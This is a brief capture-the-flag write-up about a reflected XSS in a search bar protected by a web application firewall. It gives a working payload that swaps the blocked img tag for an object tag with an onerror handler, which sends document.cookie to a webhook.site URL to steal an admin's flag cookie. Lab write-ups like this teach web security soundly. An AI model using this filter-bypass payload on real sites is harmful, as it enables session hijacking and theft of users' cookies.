# Challenge `Give me more than a simple WAF` writeup

- Vulnerability: XSS vulnerability but this time protected by a Web Application Firewall
- Where: *Search* bar
- Impact: We can inject some code in the *search* bar that will be reflected in the web browser only this time the WAF is blocking some words. This code can include a link to a website you are controlling and by doing a request to it you can collect the cookies of who did the request

## Steps to reproduce

1. Similar to the previous challenge `My favourite cookies` but change the payload to `<object data="https://webho" onerror="this.data='https://webhook.site/cb7a6cb9-b6c7-4409-b550-cac7a12ceab4?c='+document.cookie; this.removeAttribute('onerror');"></object>` because the **img** tag is blocked by the WAF. We use the **object** tag to replace it because it can also have an URL value on the **data** parameter
2. Like in the previous challenge there is an admin's cookie called **SECRET** whose value is the flag
